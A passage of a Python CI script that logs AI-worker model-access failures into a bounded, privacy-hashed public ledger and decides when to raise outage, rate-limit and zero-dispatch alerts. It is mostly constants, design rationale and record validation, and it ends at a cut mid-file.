#!/usr/bin/env python3
# [OPUS-4.8] Model-access health alerting (registry issue #32 consumes the UNCONSUMED
# worker-live.sh exit-class; part of #28 zero-dispatch visibility; #39 ALERT_TOKEN fail-silent).
#
# WHY this exists: the pipeline silently stalled for hours when Anthropic-side model access failed
# (a mix of transient API errors and usage-limit/credit exhaustion) and NOTHING alerted. The
# dispatcher FAILS CLOSED (it just skips a capped/erroring account), so a whole provider going dark
# looks identical to "nothing ready" from the logs. This script makes the registry NOTICE when it
# stops having successful model access, and it deliberately DISTINGUISHES:
#   (a) transient errors  -> alert ONLY when persistent (a burst, not a blip), and
#   (b) usage-limit exhaustion -> record reset times, alert only when a WHOLE provider is capped
#       (a single capped account is normal 5h/7d-window churn and must NOT page the maintainer).
#
# Two subcommands over one bounded, privacy-safe ledger (data/model-health.json):
#   record  — called from the always()-guarded worker.yml/review-fix.yml outcome jobs (so FAILURES
#             record too — that is the whole point) and from dispatch.yml on a zero-dispatch tick
#             or an empty-frontier (`idle`) tick.
#             Appends {ts, provider, account (SALTED HASH only — decision 22a), model_alias,
#             exit_class, run_id, reset_hint?, no-change usage fields?} via the SAME contents-API
#             CAS pattern as the lease ledger, bounded to a rolling window (max(MAX_RECORDS,
#             RETENTION_FLOOR_SECONDS) inside WINDOW_HOURS, under an absolute ceiling; pruned on
#             write).
#   decide  — reads the record window (+ the enabled provider->account fleet) and returns alert
#             ACTIONS. Idempotent: exactly ONE open alert issue per (condition, provider), updated
#             not duplicated (a hidden marker in the body keys the upsert). decide also probes the
#             provider's PUBLIC Statuspage API (issue #70) and annotates firing outage/transient
#             alerts with `provider-status:` — operational means a transient burst is likely
#             SELF-INDUCED over-parallelization; degraded/outage means a known provider incident.
#             The probe FAILS OPEN to `unknown` and can NEVER suppress an alert.
#
# Privacy (locked decision 22): NO raw account handle ever appears in a record, a log line, or an
# alert body — only the 16-hex salted hash (reuse worker-pr.account_hash). The public workflow log
# never carries provider counts either; the detail lives only in the alert issue body.
#
# The pure decision core (classify_records / decide) + the CAS writer (against a stub API) + the
# salting privacy property are unit-tested (--self-test); the CLI wraps them over `gh` / the
# contents API.
import argparse
import base64
import hashlib
import importlib.util
import json
import os
import random
import re
import subprocess
import sys
import time


_retry_spec = importlib.util.spec_from_file_location(
    "registry_ledger_retry", os.path.join(os.path.dirname(__file__), "ledger_retry.py"))
if _retry_spec is None or _retry_spec.loader is None:
    raise RuntimeError("cannot load shared ledger retry policy")
ledger_retry = importlib.util.module_from_spec(_retry_spec)
_retry_spec.loader.exec_module(ledger_retry)

# [OPUS-5] registry #701. The `why_no_diff` vocabulary is DECLARED ONCE, in the routing module that
# consumes it, and imported here — the producer (worker-live.sh), this ledger, and the dispatcher's
# decision must agree on the index<->name mapping or a stored reason decodes to a different reason.
_nc_spec = importlib.util.spec_from_file_location(
    "registry_no_change_routing", os.path.join(os.path.dirname(__file__), "no_change_routing.py"))
if _nc_spec is None or _nc_spec.loader is None:
    raise RuntimeError("cannot load the shared no_change routing vocabulary")
no_change_routing = importlib.util.module_from_spec(_nc_spec)
_nc_spec.loader.exec_module(no_change_routing)
NO_CHANGE_REASONS = no_change_routing.NO_CHANGE_REASONS

LEDGER_PATH = "data/model-health.json"
# Mutable data plane lives on a dedicated non-code branch (issue #28): required-status-check
# protection on the default branch rejects the bot's contents-API PUTs, so every ledger read and
# write pins this ref. Keep in sync with select-and-claim.py / groom.py LEDGER_REF.
LEDGER_REF = os.environ.get("REGISTRY_LEDGER_REF", "ledger")

# --- ledger bounds (WHY): a rolling window is enough to decide "is access failing NOW"; an
# unbounded append would grow the committed file forever and slow every CAS write. 200 records / 48h
# comfortably covers the ~40-slot fleet across several dispatch ticks while staying tiny in git.
# MAX_RECORDS is now the NOMINAL FLOOR of retention, not its bound: it is what retention reaches
# back to on a QUIET ledger (200 records at 5 rec/h is 40 h of coverage). On a busy one the
# TIME FLOOR below takes over — see the registry #699 block that follows.
MAX_RECORDS = 200
WINDOW_HOURS = 48
WINDOW_SECONDS = WINDOW_HOURS * 3600

# --- [OPUS-5] TIME-BASED RETENTION FLOOR (registry #699). ---------------------------------------
#
# THE DEFECT THE FLOOR FIXES. MAX_RECORDS bounds retention BY COUNT, so the wall-clock the retained
# window COVERS is MAX_RECORDS / record-rate — a busier fleet covers LESS time. The aged-out park
# exit (sustained_fleet_health_evidence, registry #691) requires the window to cover
# SUSTAINED_HEALTH_SPAN_SECONDS, so with a count cap alone that exit opens only while the fleet
# stays under MAX_RECORDS / SPAN = 200/6h = ~33 records/h. Measured on the live ledger 2026-07-26:
# 200 records / 6.69 h = 29.9 rec/h — 41 minutes and 11% of rate headroom from the trip line — and
# both sides of the line were observed inside one hour that day (11.2 rec/h fired, 61.5 rec/h
# refused). Every throughput gain shrinks coverage, so the count cap makes the standing 60/60
# throughput goal ANTI-CORRELATED with keeping the park exit open.
#
# THE RULE. prune retains max(count-cap, time-floor): everything stamped within
# RETENTION_FLOOR_SECONDS is kept REGARDLESS of count, on top of the newest MAX_RECORDS and the
# never-evicted live-backoff/dead-credential preservation (issues #82/#639). Coverage therefore
# stops depending on the record rate at all, which is the property the exit actually needs — a
# larger MAX_RECORDS would only move the trip point and would need raising again at every
# throughput step.
#
# WHY 7 h AND NOT 6. The floor must exceed SUSTAINED_HEALTH_SPAN_SECONDS (6 h, defined with the
# predicate below) by a margin, because the floor bounds the OLDEST RETAINED RECORD, not the
# coverage: at a floor of exactly 6 h the oldest surviving record sits somewhere INSIDE the span
# and `window[0]["ts"] > span_start` still refuses. The margin is the largest inter-record gap the
# coverage check can absorb at the floor boundary; one hour is ~30x the gap at the measured
# 30 rec/h and comfortably covers cross-runner clock skew. The two constants are coupled by an
# assertion at the point SUSTAINED_HEALTH_SPAN_SECONDS is defined, so they cannot drift apart.
RETENTION_FLOOR_MARGIN_SECONDS = 3600
RETENTION_FLOOR_SECONDS = 7 * 3600
# ABSOLUTE SAFETY CEILING (obligation: a pure time floor is unbounded at high rates). Retention is
# floor-selected but NEVER exceeds these, whichever binds first:
#   * RETENTION_CEILING_RECORDS — the crisp bound, and the one that states the tolerated rate:
#     2000 / 7 h = ~285 records/h sustained. That is ~4.6x today's live rate, ~9x the count-cap
#     trip point this replaces, and above the ~200 rec/h the 60/60 throughput goal implies.
#   * RETENTION_CEILING_BYTES — the PHYSICAL bound. read_ledger consumes the contents API's INLINE
#     base64 `content`, which GitHub stops populating above 1 MB; past that every reader of this
#     ledger fails loud and account-usage fails OPEN (accounts admitted with no rate-limit
#     backoff). 750 KB leaves 25% headroom. Measured live record sizes are 161 B mean / 283 B max,
#     so at realistic sizes the RECORD ceiling binds first (2000 x 283 B = 566 KB); the byte
#     ceiling binds only if records ever fatten past ~375 B mean.
# WHEN THE CEILING BINDS the oldest non-preserved records are evicted, so coverage CAN fall back
# below the span and the aged-out exit CAN close again — but never silently: prune emits a
# ::warning:: naming the condition, which bound bound, and the resulting coverage. The failure
# direction is unchanged (under-coverage DEFERS, it never releases).
RETENTION_CEILING_RECORDS = 2000
RETENTION_CEILING_BYTES = 750_000
# Per-record byte estimate overhead. _record_bytes must never UNDER-estimate the record's
# contribution to `json.dumps({"records": [...]}, indent=1)`, or the byte ceiling could admit a
# document the contents API will not inline; the nesting adds one indent level per line plus the
# separator, and the self-test asserts the estimate dominates the real document for both a live-
# shaped and a validator-maximal record set.
RECORD_BYTES_OVERHEAD = 32
LEDGER_ENVELOPE_BYTES = 64
# Future-stamp guard (cross-provider review r2 finding 2): record stamps are write-time, but the
# ledger is CAS-writable by every outcome job — a forged or clock-skewed stamp far in the FUTURE
# would (a) never age out of the rolling window and (b) anchor account_backoffs' per-record clamp
# (which is relative to the RECORD ts), yielding a backoff far past BACKOFF_CAP_SECONDS relative
# to the sweep's now. Stamps more than this far ahead of the reader's clock are implausible and
# dropped fail-open; the allowance absorbs legitimate cross-runner clock skew.
FUTURE_SKEW_SECONDS = 5 * 60

# --- exit-class taxonomy. worker-live.sh emits {session-limit, rate-limit, auth, setup, unknown}
# from nonzero HOST-observable signals, plus `no_change` after a clean model exit with no tree edit;
# never model-authored stdout. A changed-tree run records `success`. worker-prep.sh additionally
# emits {credential-remint-required, credential-refresh-transient} from the host-side credential
# pre-flight, before any model runs. We fold those into decision classes.
# `limit` == the account's usage window is exhausted (maintainer must RESET it, not retry);
# `transient` == a retryable API blip (429/529/overloaded); `auth`/`billing` == a credential/credit
# problem (rotate/top up); `unknown` == the host observed a failure but could not attribute it to
# the provider (timeout/cancelled/pre-launch abort/unrecognised nonzero exit).
SUCCESS = "success"
CLASS_LIMIT = "limit"        # session-limit: subscription/usage window exhausted
CLASS_TRANSIENT = "transient"  # rate-limit / overloaded: retryable
CLASS_AUTH = "auth"          # token invalid/expired/forbidden
CLASS_BILLING = "billing"    # credits/quota/payment (codex/openai top-up)
CLASS_SETUP = "setup"        # runner/tooling problem (NOT a provider-access signal)
CLASS_UNKNOWN = "unknown"    # unattributable failure: counts toward PERSISTENCE, never OUTAGE
CLASS_NO_CHANGE = "no_change"  # clean model exit that produced no repository change
CLASS_ZERO_DISPATCH = "zero-dispatch"  # dispatch planned >0 but launched 0 (fleet-wide signal)
# [issue #341] `idle` == the dispatcher RAN TO COMPLETION and the ready frontier was EMPTY: nothing
# was planned, nothing deferred, nothing to launch. It is the fleet's POSITIVE evidence that the
# zero-dispatch condition ("launched nothing while work was ready") is not currently true, and it
# exists because an empty frontier is otherwise recordless — a fleet that fires zero-dispatch and
# then goes permanently empty had to wait the full WINDOW_HOURS for its stale zero-dispatch records
# to age out before #205's orphan recovery could close the alert.
#
# WHY NOT REUSE `success` (the obvious fix, deliberately NOT taken). A fleet `success` asserts the
# allocator PLANNED AND LAUNCHED work, and two other consumers read it that way: it counts toward
# SUSTAINED_HEALTH_MIN_SUCCESSES and it may ANCHOR FRESHNESS on its own for the aged-out park exit
# (see the sustained-health block below and its self-test). Minting one per idle tick would
# manufacture fleet-health evidence out of an empty backlog — a park exit released by the absence
# of work. `idle` is therefore its own class: it is neither health nor ill health.
#
# WHO CAN WRITE IT. Only a caller already holding a registry token, through _cmd_record's provider/
# class pairing guard (fleet-only, refused on every real provider). That is the SAME authority that
# can already write the fleet `success` which closes this alert today — and `success` is the
# STRONGER capability of the two, since it additionally feeds the sustained-health evidence `idle`
# is defined to stay out of. So this class grants no new authority over the zero-dispatch alert.
CLASS_IDLE = "idle"          # dispatch ran; the ready frontier was empty (fleet-wide signal)

# The ONLY providers a health record may carry (issue #199). `provider` is CATALOG-controlled
# (an account issue's free-form `provider:` line, parsed verbatim), so a record command whose
# --provider is anything but a known real provider (anthropic/openai) or the fleet pseudo-provider
# (zero-dispatch's single fleet-wide signal) is a corrupt/hostile catalog value and is REFUSED —
# never written to the ledger. This is the fail-closed backstop behind the workflow change that
# stopped interpolating this string into `run:` shell source.
VALID_RECORD_PROVIDERS = frozenset({"anthropic", "openai", "fleet"})
# The PSEUDO-provider: `fleet` is not a worker account, it is the fleet-wide dispatch signal, and
# its records carry a FIXED sentinel account hash rather than a salted handle. Named here because
# any predicate that counts DISTINCT ACCOUNTS as a proxy for "more than one real account" has to
# exclude it or the dispatcher itself satisfies the count (review of PR #697).
FLEET_PSEUDO_PROVIDER = "fleet"

# raw worker-live.sh exit-class -> decision class
_EXIT_CLASS_MAP = {
    "session-limit": CLASS_LIMIT,
    "rate-limit": CLASS_TRANSIENT,
    "auth": CLASS_AUTH,
    # Host-side credential pre-flight classes (issue #596). worker-prep.sh emits these BEFORE any
    # model runs, so they are deliberately distinct RAW classes — `auth` is the bucket every
    # in-container provider rejection lands in and reads as "the provider refused the model call".
    # They fold onto the existing decision classes so the whole health/backoff/outage machinery
    # applies unchanged: a dead stored grant IS an auth-class inability to reach a working model
    # (maintainer-actionable, counts toward a provider-outage page), while an unreachable token
    # endpoint IS transient (earns the reactive backoff, never pages a re-mint).
    "credential-remint-required": CLASS_AUTH,
    "credential-refresh-transient": CLASS_TRANSIENT,
    "billing": CLASS_BILLING,
    "setup": CLASS_SETUP,
    "no_change": CLASS_NO_CHANGE,
    # An unrecognised nonzero exit / timeout / cancellation / pre-launch abort is host-observed
    # but NOT provider-attributable: `unknown` counts toward persistence (a sustained burst of
    # them still degrades throughput) but NEVER toward a provider-outage page (review defect #4 —
    # the old fold of `other` into `transient` let un-attributable failures page an outage).
    "other": CLASS_UNKNOWN,
    "zero-dispatch": CLASS_ZERO_DISPATCH,
    # claim-abort: the dispatcher's claim phase died before launching anything (review defect #6);
    # it counts toward the zero-dispatch consecutive-tick run.
    "claim-abort": CLASS_ZERO_DISPATCH,
    # [#341] the empty-frontier tick. Raw and decision spelling coincide, so this one entry both
    # accepts the workflow's `--exit-class idle` and admits `idle` into DECISION_CLASSES.
    CLASS_IDLE: CLASS_IDLE,
    SUCCESS: SUCCESS,
    # decision classes are also accepted verbatim (a caller may pass the already-folded class, and
    # the self-test uses them directly).
    CLASS_LIMIT: CLASS_LIMIT,
    CLASS_TRANSIENT: CLASS_TRANSIENT,
    CLASS_AUTH: CLASS_AUTH,
    CLASS_BILLING: CLASS_BILLING,
    CLASS_SETUP: CLASS_SETUP,
    CLASS_UNKNOWN: CLASS_UNKNOWN,
    CLASS_NO_CHANGE: CLASS_NO_CHANGE,
}
# The launch-failure classes that count toward a PROVIDER-OUTAGE (a genuine "cannot reach a working
# model" signal). `setup` is a runner/tooling fault and `unknown` is not provider-attributable
# (host could not classify), so both are EXCLUDED — unknown still counts toward the
# persistent-transient burst below.
LAUNCH_FAIL_CLASSES = frozenset({CLASS_AUTH, CLASS_BILLING, CLASS_LIMIT, CLASS_TRANSIENT})
# The classes that count toward the PERSISTENT burst (transient-for-persistence).
PERSISTENCE_CLASSES = frozenset({CLASS_TRANSIENT, CLASS_UNKNOWN})
# The starvation causes a MACHINE CAPACITY PARK can be attributed to, for the automatic
# re-admission gate ONLY (capacity_recovery_evidence). Deliberately a SEPARATE set from
# LAUNCH_FAIL_CLASSES, which drives provider-outage and backoff decisions and must not change.
#
# WHY zero-dispatch belongs here and nowhere else (sparq-org/sparq#3809). The park class this
# gate exists to release includes DISPATCH STARVATION — "N consecutive fix dispatches missed",
# which dispatch-claim parks as a capacity park precisely because the allocator found no slot.
# That cause is recorded, on the `fleet` pseudo-account, as `zero-dispatch` (dispatch planned >0
# but launched 0), and its recovery is recorded as a `success` on that same pseudo-account. But
# `zero-dispatch` is not a LAUNCH failure, so condition 1 below rejected it and a
# dispatch-starvation park could never prove its cause had cleared — the automatic re-admission
# could only ever fire for an account-credential outage.
#
# MEASURED against the live ledger (2026-07-25, 200 records): the fleet account carried 36
# zero-dispatch records and 43 successes, and was excluded by condition 1 alone — it satisfied
# the recovery and cooldown conditions already. Every other condition (a success strictly after
# BOTH the park and the account's own last failure, and no active auth cooldown) applies to
# zero-dispatch unchanged, so this widens WHICH outage can be proven recovered, never HOW
# strictly recovery must be proven.
PARK_STARVATION_CLASSES = LAUNCH_FAIL_CLASSES | frozenset({CLASS_ZERO_DISPATCH})

# The full set of decision classes a stored record's `exit_class` may hold: every fold TARGET of
# _EXIT_CLASS_MAP (SUCCESS/zero-dispatch are among its values). make_record only ever writes a
# folded class, so an exit_class outside this set is a poisoned/hand-forged document and is refused
# at construction AND at read (issue #202).
DECISION_CLASSES = frozenset(_EXIT_CLASS_MAP.values())
# Bounds on the free-form string fields of a record (model_alias/run_id, and the provider-supplied
# reset_hint). The registry is PUBLIC: every such field is bounded AND must match its
# FIELD-SPECIFIC allowlist grammar (_is_safe_field — review round 1 of PR #444: "printable" alone
# still admitted a raw acctNN handle or Markdown/HTML markup), so a hostile catalog/provider value
# can never smuggle a newline, a raw identifier, a hidden HTML marker, or an unbounded blob into
# the ledger (issue #202). The account handle carries its own stricter check (_is_hash).
RECORD_FIELD_MAX_LEN = 64
RESET_HINT_MAX_LEN = 256
# Numeric no-change evidence is public ledger data, so every value is both type-strict and bounded.
# The ceilings are deliberately generous relative to a 90-minute worker and current context sizes,
# while preventing a forged record from carrying arbitrary-precision integers.
MAX_USAGE_TOKENS = 1_000_000_000
MAX_WALL_SECONDS = 7 * 24 * 3600
MAX_ISSUE_NUMBER = 2_147_483_647

# --- THE RECORD FIELD VOCABULARY, and the READ/WRITE asymmetry around it (issue #739) ----------
# Declared ONCE here so the write posture, the read posture and the self-test's old-reader
# simulation all derive from the same set instead of restating it (the #958 shape).
RECORD_BASE_FIELDS = frozenset({
    "ts", "provider", "account", "model_alias", "exit_class", "run_id", "reset_hint"})
RECORD_NO_CHANGE_FIELDS = frozenset({
    "input_tokens", "output_tokens", "wall_seconds", "issue", "why_no_diff"})
RECORD_KNOWN_FIELDS = RECORD_BASE_FIELDS | RECORD_NO_CHANGE_FIELDS
# At most this many unrecognised field names may ride on ONE stored record before the reader calls
# the document malformed. Additive schema growth adds fields one or two at a time; a record wearing
# a dozen is junk, and an unbounded key count is a size vector on a PUBLIC read path.
MAX_UNKNOWN_RECORD_FIELDS = 8
ORIGIN_WRITE = "write"   # a record THIS release is introducing: the vocabulary above is closed
ORIGIN_READ = "read"     # a record already on the shared ledger: additive growth is tolerated
#
# WHY THE TWO POSTURES DIFFER (issue #739 — a strict read allowlist made every additive field a
# self-inflicted outage). A worker run's registry checkout is pinned at DISPATCH and its health job
# can execute tens of minutes later, so every registry deploy is a rolling upgrade with pre-merge
# READERS still live against this one shared, mutable ledger. #733 added `why_no_diff` to the writer
# and the reader in ONE commit; three in-flight runs dispatched before that commit then died on
# `unexpected field(s) ['why_no_diff']` — and because validate_ledger raises on the FIRST unknown
# field of ANY record, one new-shape record made the WHOLE ledger unreadable to them, so every
# health append in those runs was lost, not just the new one. The blast radius is wider than the
# recorder: dashboard-gen renders nothing, account-usage's reactive backoff fails open, and every
# park predicate below (capacity_recovery_evidence / park_cause_provable / _readable_window) folds
# to "no evidence". A convention ("land the reader a release early") does not fix this — conventions
# are exactly what fail, and the next one-PR field addition repeats it automatically.
#
# WHAT IS *NOT* RELAXED. The strict allowlist is load-bearing (#202: a poisoned record must not
# survive a reader) and none of it moves:
#   * WRITE posture is unchanged and total — make_record and the record append_record introduces are
#     refused outright for ANY undeclared field, so this repo can never PUT a field it has not
#     declared. Forward tolerance is therefore a property of records written by a DIFFERENT release,
#     never a licence for this one.
#   * READ posture still validates every KNOWN field with the identical grammars, so a raw handle,
#     Markdown in reset_hint, an unknown provider/class or a bad enum still fails the whole ledger
#     loud, exactly as before.
#   * The PRIVACY invariant is universal because the ledger itself is PUBLIC: an unrecognised
#     field's value is scanned for the raw `acctNN` handle pattern and refuses the document if it
#     carries one (README "Security posture", locked decision 22a).
# What is deliberately NOT constrained is the unrecognised value's TYPE or SHAPE — constraining it
# would re-create the identical incompatibility the moment a future field is a list or an object.
# That is sound because an unrecognised field has no SINK: every consumer of a health record reads
# fields BY NAME, so an unknown one is never folded, compared, or interpolated into an alert body
# (the sink-specific grammars — e.g. reset_hint's Markdown allowlist — exist for fields that ARE
# republished). Its bytes are still counted by _record_bytes and bounded by RETENTION_CEILING_BYTES.
# The NAME is constrained (token grammar + count cap) because names are what this module prints in
# its warning, and a name carrying a newline could forge a `::` workflow annotation.
#
# ONE-TIME BOOTSTRAP OBLIGATION. Readers deployed BEFORE this change are still strict, so this
# change must itself age out of the in-flight worker population before the next additive field is
# written. It is the last field addition that needs that wait; see research/739-ledger-forward-
# compatibility.md.

# --- thresholds (WHY each is what it is). Tuned to page on a real stall, stay quiet on churn.
# PROVIDER-OUTAGE: >=3 launch failures within 30 min from >= max(2, ceil(enabled-fleet/2)) distinct
# accounts whose PER-ACCOUNT tail runs contain no interleaved success (a success clears only ITS
# account — review defects #2/#3: a global success-breaks-all rule let one healthy account mask a
# real outage, while two bad accounts in a large healthy fleet could page). The fleet size comes
# from the account catalog; when the catalog is unavailable we fall back to the accounts OBSERVED
# in the window. DELIBERATE MISSES (fail-safe, documented): sparse sub-threshold failures — e.g.
# exactly two accounts failing once each, or failures straddling the 30-min window — stay silent;
# the persistent-transient and provider-capped paths cover slow burns, and record timestamps are
# write-time (a delayed outcome job records late), so a razor-thin window would misfire either way.
OUTAGE_MIN_FAILS = 3
OUTAGE_MIN_ACCOUNTS = 2
OUTAGE_WINDOW_SECONDS = 30 * 60
# PERSISTENT-TRANSIENT: >=5 transient-class failures in 15 min (even from ONE account) — a blip is
# 1-2, a genuine API degradation is a sustained burst.
TRANSIENT_MIN_FAILS = 5
TRANSIENT_WINDOW_SECONDS = 15 * 60
# ZERO-DISPATCH: >=3 consecutive ticks that planned work but launched nothing — a persistent
# inability to place ready work (capacity/access), not a single quiet tick.
ZERO_DISPATCH_MIN = 3
# CAPPED-ACCOUNT DISCRIMINATOR (#500): one task may honestly yield no edit; three no-change exits
# by one account across at least two tasks is account-side evidence. The newest qualifying record
# is derived as limit-class and therefore uses the existing reactive backoff machinery below.
NO_CHANGE_LIMIT_MIN = 3
NO_CHANGE_LIMIT_MIN_ISSUES = 2
# REACTIVE BACKOFF (maintainer decision 2026-07-17, registry issue #29): probe-EXEMPT providers
# (openai/codex — no usage API) are used until a run hits a rate limit; the health window then
# yields a per-account backoff DERIVED from the records already CAS-appended here (no separate
# ledger, no new write path). A limit/transient record starts/extends a backoff: the provider's
# own reset hint when machine-parseable, else 15 min doubling per CONSECUTIVE hit, capped at 5 h;
# a SUCCESS record resets the multiplier. Both hinted and exponential backoffs are capped so a
# forged "rate limit" line in hostile CLI-adjacent text can only sideline ONE account for <= 5 h
# per hit (availability nuisance, accepted residual — noted in the introducing PR body).
BACKOFF_BASE_SECONDS = 15 * 60
BACKOFF_CAP_SECONDS = 5 * 3600
BACKOFF_CLASSES = frozenset({CLASS_LIMIT, CLASS_TRANSIENT})
# --- AUTH COOLDOWN (registry #596). `auth` was DELIBERATELY absent from BACKOFF_CLASSES above: a
# credential problem is not a usage window, and retrying it sooner is harmless. But acct01's codex
# OAuth access token expires HOURLY while the fleet stores a static snapshot of it, so the fleet's
# ONLY cross-provider review account fails `auth` for a whole window at a time (observed live for
# fingerprint dc2d7519: 5 × auth against 5 × success interleaved in one window, then 2 more auth
# plus 1 rate in the next). Handing that credential to the allocator every tick converts a
# maintainer-fixable credential outage into a stream of dead review lanes.
#
# So a RUN of consecutive `auth` outcomes for ONE account now yields a bounded COOLDOWN through the
# EXISTING probe-exempt backoff primitive (issue #29: account_backoffs -> account-usage's
# `backoff_until` overlay -> usage_eligible skips the account). No parallel mechanism, no new
# ledger, no new write path.
#
# NOT A DISABLE — deliberately (#596 nuance). acct01 is currently the ONLY cross-provider review
# account, so marking it permanently unavailable would mean ZERO verdicts fleet-wide, which is
# strictly worse than a ~50% success rate. The cooldown is therefore a SHORT, SINGLE-STEP,
# NON-DOUBLING TTL: exactly BACKOFF_BASE_SECONDS (15 min ~= one or two of dispatch's 10-minute
# ticks), never the 5 h exponential the limit/transient chain can reach, and it expires on its own
# with no maintainer action. The account comes back automatically; the ALERT is what asks the
# maintainer to re-mint the token.
#
# WHY N=2 (AUTH_COOLDOWN_MIN). One `auth` is exactly what the hourly expiry boundary looks like,
# and the very next claim may pick up a freshly-uploaded secret — sidelining the sole reviewer on a
# single blip costs more verdict supply than it saves. TWO CONSECUTIVE auth outcomes with NO
# interleaved success is credential ROT, not a boundary flap. N=3 was considered and rejected: with
# one reviewer, three consecutive auth failures already means ~30 min of zero fleet-wide verdicts
# before anything signals, and the observed pattern is interleaved, so a 3-run is rarer than the
# outage it is supposed to catch.
#
# SCOPE (honest): account_backoffs is consumed by account-usage.py for PROBE-EXEMPT providers only
# (openai/codex), so the cooldown governs allocation for exactly those. That is not a gap — it is
# where the gap WAS. A metered provider's rejected credential already fails the usage probe, so its
# entry never reaches status `allowed` and select-and-claim's fail-closed arm excludes it (this is
# why the two revoked anthropic accounts publish as `unknown` and are already skipped). Probe-exempt
# accounts have no probe to fail closed on, which is precisely why acct01 kept being handed out.
# The ALERT below fires for either provider regardless of allocation.
AUTH_COOLDOWN_MIN = 2
AUTH_COOLDOWN_SECONDS = BACKOFF_BASE_SECONDS
# The consecutive-hit count at which the exponential arm saturates the 5 h cap (smallest n with
# BASE * 2**(n-1) >= CAP). prune's active-backoff retention (issue #82) keeps at most this many
# tail records of a live chain: past saturation, extra chain records cannot change the derived
# backoff_until (and the last record's parseable hint, when present, overrides the exponential
# anyway), so truncating there preserves the derived backoff EXACTLY while keeping the
# MAX_RECORDS bound hard.
BACKOFF_CHAIN_KEEP = 1 + (BACKOFF_CAP_SECONDS // BACKOFF_BASE_SECONDS - 1).bit_length()

# --- provider status probe (issue #70). At decide time the classifier consults the provider's
# PUBLIC Statuspage API — standard shape {"status": {"indicator": "none|minor|major|critical"}} —
# to tell a provider-side incident apart from self-induced over-parallelization. The probe is
# ANNOTATION ONLY: it can reframe an alert body but must NEVER flip `fire` off — a probe failure
# or a green status page never suppresses an alert (fail-open, mutation-checked in --self-test).
# These are public unauthenticated endpoints: no secret enters the request, no account handle
# enters the URL, and the response feeds only the fixed indicator->status fold below.
PROVIDER_STATUS_URLS = {
    "anthropic": "https://status.claude.com/api/v2/status.json",
    "openai": "https://status.openai.com/api/v2/status.json",
}
# Two-layer probe bound (review #72 round 3): the socket timeout only caps INDIVIDUAL blocking
# operations (DNS, connect, each recv) — a peer trickling one byte per few seconds never trips
# it — so the whole request additionally runs under a hard WALL-CLOCK deadline, and the body
# under a size cap (a real status.json is a few hundred bytes).
STATUS_PROBE_TIMEOUT_SECONDS = 10   # per-socket-operation timeout
STATUS_PROBE_DEADLINE_SECONDS = 20  # end-to-end wall-clock cap on one probe
STATUS_PROBE_MAX_BYTES = 1 << 20    # response-size bound
STATUS_OPERATIONAL = "operational"
STATUS_DEGRADED = "degraded"    # indicator: minor
STATUS_OUTAGE = "outage"        # indicator: major / critical
STATUS_UNKNOWN = "unknown"      # probe unreachable/malformed, or an unrecognised indicator
_INDICATOR_MAP = {"none": STATUS_OPERATIONAL, "minor": STATUS_DEGRADED,
                  "major": STATUS_OUTAGE, "critical": STATUS_OUTAGE}
# The alert conditions that carry the provider-status annotation.
PROBED_CONDITIONS = frozenset({"provider-outage", "persistent-transient"})

ALERT_LABEL = "ops-alert"
MARKER_PREFIX = "model-health-alert"   # hidden HTML marker keying the idempotent upsert

# Authoritative cap for the marker-issue lookup (#203). The old lookup read only 50 issues, but
# CLOSED alert markers accumulate across every flap and are never deleted, so a small window could
# push a reopen-eligible marker out of view — the caller then treated "not in the window" as "not
# found" and minted a DUPLICATE alert over it. gh paginates the API internally to fill --limit, so
# a generous cap turns the lookup authoritative; a result AT the cap is treated as possibly
# truncated and raised (a distinct state the caller fails closed on, never a blind create).
ALERT_LOOKUP_CAP = 1000


# ---------------------------------------------------------------------------------------------
# pure helpers (unit-tested)
# ---------------------------------------------------------------------------------------------
def account_hash(handle, salt):
    """Privacy-preserving account fingerprint (locked decision 22a), IDENTICAL to
    worker-pr.account_hash: sha256(handle + ':' + salt)[:16]. The registry is PUBLIC, so a record
    stores ONLY this hash — never the raw acctNN handle. A missing handle/salt fails loud so a
    record can never be written with a raw or empty identifier."""
    if not handle or not salt:
        raise ValueError("account hashing requires both a handle and a salt")
    return hashlib.sha256(f"{handle}:{salt}".encode()).hexdigest()[:16]


def _decision_class(exit_class):
    """Fold a raw worker-live.sh exit-class into a decision class (fail-safe: a novel class maps to
    `unknown`, which still counts toward persistence but can never page a provider-outage — the
    host did not attribute it to the provider)."""
    return _EXIT_CLASS_MAP.get(exit_class, CLASS_UNKNOWN)


def make_record(provider, account_h, model_alias, exit_class, run_id, now, reset_hint=None,
                input_tokens=None, output_tokens=None, wall_seconds=None, issue=None,
                why_no_diff=None):
    """Build one health record. `account_h` MUST already be the salted hash (a raw handle here is a
    privacy bug — the caller salts). reset_hint (a provider reset time string) is kept ONLY for the
    limit + transient (rate-limit) classes, where it is actionable (maintainer alert body / the
    reactive-backoff duration for probe-exempt providers). A no_change record carries its target
    issue plus optional numeric input/output/wall telemetry; these are evidence fields only, never
    transcript content.

    The FULLY-ASSEMBLED record is fail-closed validated before it is returned (issue #202): the
    account must be a salted hash (never a raw acctNN handle), the provider must be catalog-known,
    the class a known fold target, and every other string field bounded and inside its
    field-specific allowlist grammar (never a raw handle or Markdown markup). A record
    that a reader would later reject as malformed (poisoning the whole ledger) can therefore never
    be constructed in the first place — construction fails loud instead."""
    rec = {
        "ts": int(now),
        "provider": str(provider),
        "account": account_h,
        "model_alias": str(model_alias or ""),
        "exit_class": _decision_class(exit_class),
        "run_id": str(run_id or ""),
    }
    if rec["exit_class"] in BACKOFF_CLASSES and reset_hint:
        rec["reset_hint"] = str(reset_hint)
    no_change_fields = {
        "input_tokens": input_tokens,
        "output_tokens": output_tokens,
        "wall_seconds": wall_seconds,
        "issue": issue,
        # [#701] The model's own declared reason it produced no diff. Stored as the VOCABULARY NAME
        # (the wire index is an envelope detail); the validator below admits nothing else, so this
        # is a closed enum in the public ledger, not free text.
        "why_no_diff": why_no_diff,
    }
    for field, value in no_change_fields.items():
        if value is not None:
            rec[field] = value
    _validate_record(rec, ORIGIN_WRITE)
    return rec


def _record_bytes(record):
    """Upper bound on ONE record's contribution to the serialized ledger document (registry #699).
    Deliberately an OVER-estimate: `json.dumps(record, indent=1)` plus RECORD_BYTES_OVERHEAD for the
    extra indent level and separator the record picks up once it is nested inside
    {"records": [...]}. Under-estimating here would let the byte ceiling admit a document the
    contents API refuses to inline, which fails every reader — so the estimate must dominate, and
    the self-test asserts it does."""
    return len(json.dumps(record, indent=1)) + RECORD_BYTES_OVERHEAD


def _ledger_bytes(records):
    """Upper bound on the serialized size of a whole window (see _record_bytes)."""
    return sum(_record_bytes(r) for r in records) + LEDGER_ENVELOPE_BYTES


def _apply_retention_ceiling(kept, selected, preserved, now):
